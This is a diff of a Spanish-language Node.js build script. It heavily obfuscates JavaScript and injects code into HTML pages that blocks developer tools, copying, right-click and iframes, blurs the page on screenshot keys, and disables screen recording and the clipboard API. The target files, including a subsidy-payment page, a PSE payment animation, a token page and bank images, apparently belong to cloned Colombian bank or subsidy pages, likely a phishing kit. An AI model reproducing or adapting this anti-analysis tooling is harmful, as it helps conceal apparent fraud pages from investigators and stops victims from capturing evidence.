@@ -1,67 +1,58 @@
 /* ============================================
-   OFUSCAR PYP + BOGOTA
-   + ANTI-INSPECCIÓN
-   + ANTI-CAPTURAS DE PANTALLA
-   + OPTIMIZACIÓN DE IMÁGENES CON SHARP
+   OFUSCAR BUCARAMANGA (MÁXIMA PROTECCIÓN)
    ============================================ */
 
 const fs = require('fs');
 const path = require('path');
 const JavaScriptObfuscator = require('javascript-obfuscator');
 const { minify: minifyHTML } = require('html-minifier-terser');
-const CleanCSS = require('clean-css');
 
 let sharp = null;
 try {
     sharp = require('sharp');
 } catch (e) {
-    console.log('⚠️  Sharp no instalado - se omitirá la optimización de imágenes');
-    console.log('   Instálalo con: npm install sharp\n');
+    console.log('⚠️  Sharp no instalado');
 }
 
-// ============================================
-// CONFIGURACIÓN DE CARPETAS
-// ============================================
-const CARPETA_PYP = path.join(__dirname, 'pyp-build');
-const CARPETA_BOGOTA = path.join(__dirname, 'bogota-build');
+const CARPETA_BUCARAMANGA = path.join(__dirname, 'bucaramanga build');
 
 // ============================================
-// CONFIGURACIÓN DEL OFUSCADOR JS
+// CONFIGURACIÓN DEL OFUSCADOR (MÁXIMA SEGURIDAD SIN ROMPER)
 // ============================================
 const CONFIG_JS = {
     compact: true,
     controlFlowFlattening: true,
-    controlFlowFlatteningThreshold: 0.75,
+    controlFlowFlatteningThreshold: 1, // Máximo
     deadCodeInjection: true,
-    deadCodeInjectionThreshold: 0.4,
-    debugProtection: false,
-    debugProtectionInterval: 0,
+    deadCodeInjectionThreshold: 0.5,   // Inyecta mucho código basura
+    debugProtection: true,             // Bloquea el depurador
+    debugProtectionInterval: 4000,     
     disableConsoleOutput: true,
-    identifierNamesGenerator: 'hexadecimal',
+    identifierNamesGenerator: 'mangled-shuffled', 
     log: false,
     numbersToExpressions: true,
-    renameGlobals: false,
-    selfDefending: true,
+    renameGlobals: false,              // 🔥 CRUCIAL: Lo dejamos en false para que el HTML encuentre las funciones
+    selfDefending: false,              // 🔥 Lo apagamos para que no se autodestruya en local
     simplify: true,
     splitStrings: true,
-    splitStringsChunkLength: 10,
+    splitStringsChunkLength: 5,
     stringArray: true,
     stringArrayCallsTransform: true,
-    stringArrayEncoding: ['base64'],
+    stringArrayEncoding: ['rc4'],      // Cifrado fuerte para strings
     stringArrayIndexShift: true,
     stringArrayRotate: true,
     stringArrayShuffle: true,
-    stringArrayWrappersCount: 2,
+    stringArrayWrappersCount: 5,       
     stringArrayWrappersChainedCalls: true,
-    stringArrayWrappersParametersMaxCount: 4,
+    stringArrayWrappersParametersMaxCount: 5,
     stringArrayWrappersType: 'function',
-    stringArrayThreshold: 0.75,
+    stringArrayThreshold: 1,           
     unicodeEscapeSequence: false,
     transformObjectKeys: true
 };
 
 // ============================================
-// BLOQUE ANTI-INSPECCIÓN + ANTI-CAPTURAS
+// BLOQUE ANTI-INSPECCIÓN
 // ============================================
 const BLOQUE_ANTI = `
 <script>
@@ -90,85 +81,33 @@ document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
 document.addEventListener('selectstart',function(_0xl1){_0xl1.preventDefault();});
 document.addEventListener('copy',function(_0xm2){_0xm2.preventDefault();return false;});
 document.addEventListener('cut',function(_0xn3){_0xn3.preventDefault();return false;});
-
 try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xo4){document.body.innerHTML='';}
-
 var _0xp5=null;
 function _0xq6(){
     document.documentElement.style.filter='blur(20px)';
     document.documentElement.style.transition='filter 0.1s';
-    setTimeout(function(){
-        document.documentElement.style.filter='';
-    },1500);
+    setTimeout(function(){document.documentElement.style.filter='';},1500);
 }
 window.addEventListener('keyup',function(_0xr7){
-    var _0xs8=_0xr7.key||'';
-    var _0xt9=_0xs8.toLowerCase();
-    if(_0xt9==='printscreen'||_0xr7.keyCode===44){
-        _0xq6();
-        if(navigator.clipboard&&navigator.clipboard.writeText){
-            try{navigator.clipboard.writeText('');}catch(e){}
-        }
-    }
+    var _0xs8=_0xr7.key||''; var _0xt9=_0xs8.toLowerCase();
+    if(_0xt9==='printscreen'||_0xr7.keyCode===44){_0xq6();if(navigator.clipboard&&navigator.clipboard.writeText){try{navigator.clipboard.writeText('');}catch(e){}}}
     if(_0xr7.metaKey&&_0xr7.shiftKey&&_0xt9==='s'){_0xq6();}
     if(_0xr7.metaKey&&_0xt9==='printscreen'){_0xq6();}
     if(_0xr7.metaKey&&_0xr7.shiftKey&&(_0xt9==='3'||_0xt9==='4'||_0xt9==='5')){_0xq6();}
 },{capture:true});
-
 var _0xu0=0;
-window.addEventListener('blur',function(){
-    _0xu0=new Date().getTime();
-    _0xq6();
-});
-window.addEventListener('focus',function(){
-    if(_0xu0>0){
-        var _0xv1=new Date().getTime()-_0xu0;
-        if(_0xv1<800){_0xq6();}
-    }
-});
-
-document.addEventListener('visibilitychange',function(){
-    if(document.hidden){document.body.style.filter='blur(30px)';}
-    else{document.body.style.filter='';}
-});
-
-if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
-    var _0xw2=navigator.mediaDevices.getDisplayMedia;
-    navigator.mediaDevices.getDisplayMedia=function(){
-        _0xq6();
-        return Promise.reject(new Error('Captura de pantalla no permitida'));
-    };
-}
-
-if(window.MediaRecorder){
-    var _0xx3=window.MediaRecorder;
-    window.MediaRecorder=function(){
-        _0xq6();
-        throw new Error('Grabación no permitida');
-    };
-}
-
-var _0xy4=new Image();
-Object.defineProperty(_0xy4,'id',{
-    get:function(){
-        document.body.style.filter='blur(15px)';
-        setTimeout(function(){document.body.style.filter='';},2000);
-    }
-});
-
-if(navigator.clipboard){
-    try{
-        navigator.clipboard.writeText=function(){return Promise.reject();};
-        navigator.clipboard.write=function(){return Promise.reject();};
-    }catch(e){}
-}
-
+window.addEventListener('blur',function(){_0xu0=new Date().getTime();_0xq6();});
+window.addEventListener('focus',function(){if(_0xu0>0){var _0xv1=new Date().getTime()-_0xu0;if(_0xv1<800){_0xq6();}}});
+document.addEventListener('visibilitychange',function(){if(document.hidden){document.body.style.filter='blur(30px)';}else{document.body.style.filter='';}});
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){navigator.mediaDevices.getDisplayMedia=function(){_0xq6();return Promise.reject(new Error('No'));};}
+if(window.MediaRecorder){window.MediaRecorder=function(){_0xq6();throw new Error('No');};}
+if(navigator.clipboard){try{navigator.clipboard.writeText=function(){return Promise.reject();};navigator.clipboard.write=function(){return Promise.reject();};}catch(e){}}
 })();
 </script>
 `;
 
 // ============================================
-// FUNCIONES DE OFUSCACIÓN
+// FUNCIONES
 // ============================================
 function ofuscarJS(carpeta, archivo) {
     const ruta = path.join(carpeta, archivo);
@@ -176,12 +115,11 @@ function ofuscarJS(carpeta, archivo) {
         console.log(`   ⚠️  No existe: ${archivo}`);
         return;
     }
-
     try {
         const codigo = fs.readFileSync(ruta, 'utf8');
         const resultado = JavaScriptObfuscator.obfuscate(codigo, CONFIG_JS);
         fs.writeFileSync(ruta, resultado.getObfuscatedCode());
-        console.log(`   ✅ ${archivo}`);
+        console.log(`   ✅ ${archivo} (Ofuscado con éxito)`);
     } catch (err) {
         console.log(`   ❌ Error en ${archivo}: ${err.message}`);
     }
@@ -189,22 +127,12 @@ function ofuscarJS(carpeta, archivo) {
 
 async function minificarHTML(carpeta, archivo) {
     const ruta = path.join(carpeta, archivo);
-    if (!fs.existsSync(ruta)) {
-        console.log(`   ⚠️  No existe: ${archivo}`);
-        return;
-    }
-
+    if (!fs.existsSync(ruta)) return;
     try {
         let codigo = fs.readFileSync(ruta, 'utf8');
-
-        if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf("addEventListener('contextmenu'") === -1) {
-            if (codigo.indexOf('</body>') !== -1) {
-                codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
-            } else {
-                codigo += BLOQUE_ANTI;
-            }
+        if (codigo.indexOf('_0xa1=0') === -1) {
+            codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
         }
-
         const resultado = await minifyHTML(codigo, {
             collapseWhitespace: true,
             removeComments: true,
@@ -213,148 +141,35 @@ async function minificarHTML(carpeta, archivo) {
             removeStyleLinkTypeAttributes: true,
             useShortDoctype: true,
             minifyCSS: true,
-            minifyJS: false
+            minifyJS: false 
         });
         fs.writeFileSync(ruta, resultado);
-        console.log(`   ✅ ${archivo}`);
+        console.log(`   ✅ ${archivo} (Minificado + Anti-Inspección)`);
     } catch (err) {
         console.log(`   ❌ Error en ${archivo}: ${err.message}`);
     }
 }
 
-function minificarCSS(carpeta, archivo) {
-    const ruta = path.join(carpeta, archivo);
-    if (!fs.existsSync(ruta)) {
-        console.log(`   ⚠️  No existe: ${archivo}`);
-        return;
-    }
-
-    try {
-        const codigo = fs.readFileSync(ruta, 'utf8');
-        const resultado = new CleanCSS({ level: 2 }).minify(codigo);
-        fs.writeFileSync(ruta, resultado.styles);
-        console.log(`   ✅ ${archivo}`);
-    } catch (err) {
-        console.log(`   ❌ Error en ${archivo}: ${err.message}`);
-    }
-}
-
-// ============================================
-// OPTIMIZACIÓN DE IMÁGENES
-// ============================================
 async function optimizarImagen(rutaEntrada) {
     const ext = path.extname(rutaEntrada).toLowerCase();
-    const nombre = path.basename(rutaEntrada);
-    const statsAntes = fs.statSync(rutaEntrada).size;
-
-    if (ext === '.gif') {
-        console.log(`   ⏭️  Saltando: ${nombre} (GIF animado)`);
-        return;
-    }
-
-    if (!/\.(jpg|jpeg|png|webp)$/i.test(ext)) {
-        return;
-    }
-
-    let pipeline = sharp(rutaEntrada);
-
+    if (ext === '.gif' || !/\.(jpg|jpeg|png|webp)$/i.test(ext)) return;
     try {
-        if (ext === '.jpg' || ext === '.jpeg') {
-            pipeline = pipeline.jpeg({ quality: 80, mozjpeg: true, progressive: true });
-        } else if (ext === '.png') {
-            pipeline = pipeline.png({ compressionLevel: 9, palette: true });
-        } else if (ext === '.webp') {
-            pipeline = pipeline.webp({ quality: 80, effort: 4 });
-        }
-
-        const buffer = await pipeline.toBuffer();
-        fs.writeFileSync(rutaEntrada, buffer);
-
-        const statsDespues = fs.statSync(rutaEntrada).size;
-        const ahorro = ((1 - statsDespues / statsAntes) * 100).toFixed(1);
-
-        if (ahorro > 0) {
-            console.log(`   ✅ ${nombre}: ${(statsAntes/1024).toFixed(1)}KB → ${(statsDespues/1024).toFixed(1)}KB (-${ahorro}%)`);
-        } else {
-            console.log(`   ✅ ${nombre}: ya estaba optimizada`);
-        }
-    } catch (err) {
-        console.log(`   ❌ Error en ${nombre}: ${err.message}`);
-    }
+        let pipeline = sharp(rutaEntrada);
+        if (ext === '.jpg' || ext === '.jpeg') pipeline = pipeline.jpeg({ quality: 80, mozjpeg: true });
+        else if (ext === '.png') pipeline = pipeline.png({ compressionLevel: 9, palette: true });
+        else if (ext === '.webp') pipeline = pipeline.webp({ quality: 80, effort: 4 });
+        await pipeline.toFile(rutaEntrada + '.tmp');
+        fs.renameSync(rutaEntrada + '.tmp', rutaEntrada);
+        console.log(`   ✅ Optimizada: ${path.basename(rutaEntrada)}`);
+    } catch (err) {}
 }
 
 async function optimizarCarpeta(carpeta) {
-    if (!fs.existsSync(carpeta)) {
-        return;
-    }
-
-    const archivos = fs.readdirSync(carpeta);
-
-    for (const archivo of archivos) {
-        const rutaCompleta = path.join(carpeta, archivo);
-        const stat = fs.statSync(rutaCompleta);
-
-        if (stat.isDirectory()) {
-            await optimizarCarpeta(rutaCompleta);
-        } else {
-            await optimizarImagen(rutaCompleta);
-        }
-    }
-}
-
-// ============================================
-// PROCESAR PYP
-// ============================================
-async function procesarPYP() {
-    console.log('\n═══════════════════════════════════════');
-    console.log('🔒 PROCESANDO PYP (pyp-build)');
-    console.log('═══════════════════════════════════════\n');
-
-    if (!fs.existsSync(CARPETA_PYP)) {
-        console.log(`❌ ERROR: No existe la carpeta "${CARPETA_PYP}"\n`);
-        return;
-    }
-
-    console.log('📄 Minificando HTML + anti-inspección:');
-    await minificarHTML(CARPETA_PYP, 'index.html');
-
-    console.log('\n📄 Ofuscando archivos JS:');
-    ofuscarJS(CARPETA_PYP, 'pse-animacion.js');
-
-    console.log('\n📄 Minificando CSS:');
-    minificarCSS(CARPETA_PYP, 'styles.css');
-
-    if (sharp) {
-        console.log('\n🖼️  Optimizando imágenes:');
-        await optimizarCarpeta(path.join(CARPETA_PYP, 'img'));
-    }
-}
-
-// ============================================
-// PROCESAR BOGOTA
-// ============================================
-async function procesarBogota() {
-    console.log('\n═══════════════════════════════════════');
-    console.log('🔒 PROCESANDO BOGOTA (bogota-build)');
-    console.log('═══════════════════════════════════════\n');
-
-    if (!fs.existsSync(CARPETA_BOGOTA)) {
-        console.log(`❌ ERROR: No existe la carpeta "${CARPETA_BOGOTA}"\n`);
-        return;
-    }
-
-    console.log('📄 Minificando HTML + anti-inspección:');
-    await minificarHTML(CARPETA_BOGOTA, 'index.html');
-    await minificarHTML(CARPETA_BOGOTA, 'token.html');
-
-    console.log('\n📄 Minificando CSS:');
-    minificarCSS(CARPETA_BOGOTA, 'index.css');
-    minificarCSS(CARPETA_BOGOTA, 'token.css');
-    minificarCSS(CARPETA_BOGOTA, 'loading-overlay.css');
-
-    if (sharp) {
-        console.log('\n🖼️  Optimizando imágenes:');
-        await optimizarCarpeta(path.join(CARPETA_BOGOTA, 'img'));
+    if (!fs.existsSync(carpeta)) return;
+    for (const archivo of fs.readdirSync(carpeta)) {
+        const ruta = path.join(carpeta, archivo);
+        if (fs.statSync(ruta).isDirectory()) await optimizarCarpeta(ruta);
+        else await optimizarImagen(ruta);
     }
 }
 
@@ -362,43 +177,22 @@ async function procesarBogota() {
 // EJECUTAR
 // ============================================
 async function main() {
-    console.log('\n╔═══════════════════════════════════════╗');
-    console.log('║   OFUSCADOR PYP + BOGOTÁ + ANTI-INS   ║');
-    console.log('╚═══════════════════════════════════════╝');
+    console.log('\n🔒 INICIANDO OFUSCACIÓN EXTREMA...\n');
 
-    await procesarPYP();
-    await procesarBogota();
+    // 1. Minificar HTML y meterle el Anti-F12
+    await minificarHTML(CARPETA_BUCARAMANGA, 'pagodesubsidio.html'); 
 
-    console.log('\n╔═══════════════════════════════════════╗');
-    console.log('║   ✅ TODO OFUSCADO + PROTEGIDO        ║');
-    console.log('╚═══════════════════════════════════════╝');
+    // 2. Ofuscar TODO el JavaScript (El pse y el app.js)
+    ofuscarJS(CARPETA_BUCARAMANGA, 'pse-animacion.js');
+    ofuscarJS(CARPETA_BUCARAMANGA, 'app.js');
 
-    console.log('\n🔒 Protecciones activadas:');
-    console.log('   ❌ F12 bloqueado');
-    console.log('   ❌ Ctrl+Shift+I / J / C bloqueado');
-    console.log('   ❌ Ctrl+U / S / P / A bloqueado');
-    console.log('   ❌ Click derecho bloqueado');
-    console.log('   ❌ Arrastrar / Copiar / Cortar / Seleccionar bloqueado');
-    console.log('   ❌ Iframes bloqueados');
-    console.log('   ❌ PrintScreen bloqueado (blur + limpieza clipboard)');
-    console.log('   ❌ Windows + Shift + S / PrintScreen bloqueado');
-    console.log('   ❌ Cmd + Shift + 3/4/5 (Mac) bloqueado');
-    console.log('   ❌ getDisplayMedia bloqueado');
-    console.log('   ❌ MediaRecorder bloqueado');
-    console.log('   ❌ Cambio de pestaña → blur');
-    console.log('   ❌ Pérdida de foco → blur');
-    console.log('   ❌ Clipboard API deshabilitada');
-
-    console.log('\n🖼️  Optimización de imágenes:');
+    // 3. Optimizar imágenes
     if (sharp) {
-        console.log('   ✅ JPG/JPEG comprimidos (calidad 80)');
-        console.log('   ✅ PNG comprimidos nivel 9 + palette');
-        console.log('   ✅ WebP comprimidos (calidad 80)');
-        console.log('   ⏭️  GIFs saltados');
-    } else {
-        console.log('   ⚠️  Sharp no instalado');
+        await optimizarCarpeta(path.join(CARPETA_BUCARAMANGA, 'img'));
+        await optimizarCarpeta(path.join(CARPETA_BUCARAMANGA, 'bancos'));
     }
-    console.log('');
+
+    console.log('\n✅ TODO LISTO Y PROTEGIDO.\n');
 }
 
 main();
